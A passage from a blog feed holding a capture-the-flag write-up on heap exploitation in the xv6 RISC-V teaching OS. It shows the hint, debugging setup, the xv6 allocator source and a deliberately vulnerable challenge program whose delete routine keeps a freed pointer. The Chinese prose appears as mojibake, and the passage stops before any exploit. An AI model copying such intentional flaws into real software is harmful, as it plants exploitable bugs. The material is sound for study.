†åˆ©ç”¨æ‰‹æ³•éƒ½è¿‡æ—¶äº†ï¼Œä¸è¿‡æ„Ÿè§‰ä¾ç„¶å¯ä»¥ä½œä¸ºä¸€æœ¬å¾ˆå¥½å¾ˆç³»ç»Ÿçš„<code>pwn</code>å…¥é—¨ä¹¦ç±ï¼ŒæœŸæœ«åçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æƒ³å­¦<code>pwn</code>çš„å­¦å¼Ÿï¼ŒæŠŠè¿™æœ¬ä¹¦é€ä»–å¹¶å¤©å¤©ç£ä¿ƒä»–å­¦<code>pwn</code>(å·²ç»æœ‰ä¸€ä½å­¦<code>web</code>çš„å­¦å¼Ÿæˆä¸ºå—å®³è€…äº†)ï¼Œå¥½ä¹¦ä¸èƒ½æµªè´¹(å…¶å®æ˜¯æ€•ä»¥åæ²¡äººå¸¦&gt;_&lt;)</p><h2 id="2024-1-1"><a href="#2024-1-1" class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h2><p>2023å¹´è¿‡çš„å¤ªå¤±è´¥äº†ï¼Œ2024ç»™æˆ‘å†²ï¼ï¼ï¼æˆ‘è¦å˜å¼ºï¼ï¼ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€é“risc-væ¶æ„xv6æ“ä½œç³»ç»Ÿçš„å †</title>
      <link href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
      <url>/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<p>é™„ä»¶ï¼š<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>è¿™æ˜¯ä¸€é“<code>133nson</code>å¸ˆå…„å‡ºçš„é¢˜(å¤ªå¼ºå•¦),çœ‹äº†ååªèƒ½è¯´è‡ªå·±çš„è§è¯†è¿˜æ˜¯å¤ªå°‘äº†ã€‚<br>è¿™ä¸€é“æ˜¯<code>xv6</code>ç³»ç»Ÿçš„å †é¢˜ï¼Œé™„ä»¶å·²ç»ç»™å‡ºäº†ä¸€ä¸ªå®Œæ•´çš„<code>qemu</code>ç¯å¢ƒï¼Œåªè¦è¾“å…¥<code>./run.sh</code>å³å¯å¯åŠ¨ç¨‹åº<br>é¢˜ç›®æœ‰ä¸€ä¸ª<code>hint</code>æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>ç”±äº<code>elf</code>æ–‡ä»¶æ˜¯é™„å¸¦è°ƒè¯•ä¿¡æ¯ç¼–è¯‘çš„ï¼Œè¿™å¤§å¤§æ–¹ä¾¿äº†æˆ‘ä»¬è¿›è¡ŒåŠ¨æ€è°ƒè¯•</p><h3 id="å¦‚ä½•è°ƒè¯•"><a href="#å¦‚ä½•è°ƒè¯•" class="headerlink" title="å¦‚ä½•è°ƒè¯•"></a>å¦‚ä½•è°ƒè¯•</h3><p>ç›¸ä¿¡å¾ˆå¤šèŒæ–°è¿˜ä¸çŸ¥é“æ€ä¹ˆè¿›è¡Œè°ƒè¯•ï¼Œè¿™é‡Œå°±è¿›è¡Œå‚»ç“œå¼æ•™å­¦<br>é¦–å…ˆåœ¨<code>github</code>ä¸Šé¢ä¸‹è½½<code>umalloc.c</code>æ–‡ä»¶(<code>hint</code>æ–‡ä»¶ä¸Šå†™æ˜äº†)ï¼Œç„¶åå°†è¯¥æ–‡ä»¶æ”¾å…¥åœ¨å’Œ<code>chal</code>åŒä¸€ä¸ªè·¯å¾„ä¸‹<br>ç„¶åå°†<code>run.sh</code>æ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œä¿®æ”¹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶é€šè¿‡<code>./run.sh</code>æ¥å¯åŠ¨ï¼Œç„¶åå†é‡æ–°æ‰“å¼€å¦å¤–ä¸€ä¸ªç»ˆç«¯ï¼Œè¿›å…¥åˆ°<code>chal</code>æ–‡ä»¶çš„è·¯å¾„ä¸‹ï¼Œé€šè¿‡<code>gdb-multiarch</code>ï¼Œç„¶åä¾æ¬¡è¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å³å¯è¿›è¡Œè°ƒè¯•ï¼Œä¸è¿‡æˆ‘ä»¬ä¸èƒ½å‘å¹³æ—¶ä¸€æ ·é€šè¿‡<code>bin</code>ã€<code>stack</code>è¿™äº›æŒ‡ä»¤æ¥æŸ¥çœ‹å †å†…å­˜(å…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æ€ä¹ˆçœ‹ï¼Œè¯·æ±‚å¤§ä½¬æŒ‡æ•™)ï¼Œä¸è¿‡x<code>/16gx</code> è¿™ä¸€äº›åŸºç¡€çš„æŒ‡ä»¤è¿˜æ˜¯å¯ä»¥ä½¿ç”¨</p><h3 id="xv6å †ç®¡ç†åˆ†æ"><a href="#xv6å †ç®¡ç†åˆ†æ" class="headerlink" title="xv6å †ç®¡ç†åˆ†æ"></a>xv6å †ç®¡ç†åˆ†æ</h3><p>é¦–å…ˆæ¥çœ‹çœ‹<code>xv6</code>ä¸­çš„å †å—é•¿ä»€ä¹ˆæ ·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å †å—çš„ç»“æ„å’Œæˆ‘ä»¬å¹³æ—¶<code>glibc</code>ä¸­çš„ä¸ä¸€æ ·ï¼Œä»–æ²¡æœ‰<code>prev_size</code>ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯å †å—çš„æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥çŒœåˆ°è¿™ä¸ªæŒ‡é’ˆå› è¯¥å’Œæˆ‘ä»¬çš„<code>fd</code>æŒ‡é’ˆç±»ä¼¼(å‚¨å­˜åœ¨<code>free</code>åçš„é“¾è¡¨ä¸­çš„ä¸‹ä¸€ä¸ª<code>free</code>çš„å †å—çš„å †å¤´çš„ä½ç½®)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¾§é‡çœ‹ä¸€ä¸‹å †å—å¤§å°çš„è®¡ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚å°±æ˜¯åŸæœ¬çš„å †å—å¤§å°å‡ä¸€åŠ ä¸Šä¸€ä¸ªå †å¤´ç»“æ„çš„å¤§å°åé™¤ä»¥å †å¤´çš„å¤§å°å†å‘ä¸Šå–æ•´ï¼ˆæ¯”å¦‚ç”³è¯·<code>0x19</code>å¤§å°çš„å †å—è®¡ç®—å‡ºçš„<code>size</code>ä¸º<code>3</code>ï¼Œç”³è¯·<code>0x30</code>çš„å †å—è®¡ç®—å‡ºçš„<code>size</code>ä¸º<code>4</code>ï¼‰</p><h4 id="mallocå‡½æ•°"><a href="#mallocå‡½æ•°" class="headerlink" title="mallocå‡½æ•°"></a>mallocå‡½æ•°</h4><p>åœ¨<code>malloc</code>å‡½æ•°ä¸­ï¼Œå…ˆæ ¹æ®ç”³è¯·çš„å †å—è®¡ç®—å‡ºç›¸åº”çš„å †å—å¤§å°ï¼Œè‹¥<code>free</code>é“¾è¡¨çš„è¡¨å¤´ä¸º<code>0</code>ï¼ˆ<code>free</code>é“¾è¡¨å°šæœªåˆå§‹åŒ–ï¼Œåˆ™ä¼šå°†é™æ€å…¨å±€å˜é‡<code>base</code>çš„åœ°å€èµ‹å€¼ç»™<code>free</code>çš„è¡¨å¤´æŒ‡é’ˆ<code>freep</code>ï¼‰ã€‚ç„¶åä¼šä»<code>prevp-&gt;s.ptr</code>ï¼ˆè¡¨å¤´åçš„ç¬¬ä¸€ä¸ªå †å—æŒ‡é’ˆï¼‰å¼€å§‹é¡ºç€<code>s.ptr</code>éå†<code>free</code>é“¾è¡¨ï¼Œè‹¥é‡åˆ°æ¯”å¾…ç”³è¯·çš„å †å—å¤§å°å¤§çš„å †å—ï¼Œåˆ™ä¼šç›´æ¥åˆ‡åˆ†è¯¥å †å—ï¼Œå°†å‰ä¸€éƒ¨åˆ†è¿”å›ï¼Œåä¸€éƒ¨åˆ†ç•™åœ¨é“¾è¡¨å†…ï¼›è‹¥é‡åˆ°<code>size</code>åˆšå¥½ç¬¦åˆéœ€æ±‚çš„ï¼Œåˆ™å°†å…¶è„±é“¾åç›´æ¥è¿”å›ï¼›è‹¥éå†å®Œæ•´ä¸ªé“¾è¡¨ä»æœªé‡åˆ°å¯ä»¥è¿›è¡Œåˆ†é…çš„<code>free</code>å †å—ï¼Œåˆ™ä¼šè°ƒç”¨<code>morecore</code>å‡½æ•°å‘ç³»ç»Ÿç”³è¯·æ›´å¤šçš„å†…å­˜ã€‚</p><h4 id="freeå‡½æ•°"><a href="#freeå‡½æ•°" class="headerlink" title="freeå‡½æ•°"></a>freeå‡½æ•°</h4><p>åœ¨<code>free</code>å‡½æ•°ä¸­ï¼Œä¼šå…ˆéå†<code>free</code>é“¾è¡¨ï¼Œè‹¥é€”ä¸­é‡åˆ°å¾…é‡Šæ”¾çš„å †å—åœ°å€å¤„äºé“¾è¡¨ä¸­çš„ä¸¤ä¸ª<code>free</code>å †å—ä¹‹é—´çš„è¯ï¼Œåˆ™ä¼šæå‰é€€å‡ºï¼Œå¦åˆ™ç­‰å¾…é“¾è¡¨è¢«éå†å®Œä¸€è½®ä¹‹åé€€å‡ºï¼ˆå®é™…ä¸Šè¯¥é“¾è¡¨ä¸ºä¸€ä¸ªå•å‘å¾ªç¯é“¾è¡¨ï¼‰ã€‚ç„¶åæ£€æŸ¥è¯¥å †å—æ˜¯å¦æœ‰å‰&#x2F;åå‘ç›¸é‚»çš„<code>free</code>å †å—ï¼Œè‹¥æœ‰åˆ™è¿›è¡Œå‰&#x2F;åå‘åˆå¹¶ï¼Œè‹¥æ— åˆ™å°†å…¶ç›´æ¥æ’å…¥åˆ°<code>free</code>é“¾è¡¨ä¸­ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>æŸ¥çœ‹ä¿æŠ¤æœºåˆ¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@åœˆåœˆ:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>åªå¼€å¯çš„<code>NX enabled</code>(<code>133nson</code>ï¼šâ€œé€åˆ†é¢˜â€)<br>å‡ºé¢˜äººæ¯”è¾ƒå‹å¥½ï¼Œç›´æ¥ç»™å‡ºäº†é¢˜ç›®æºç <br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 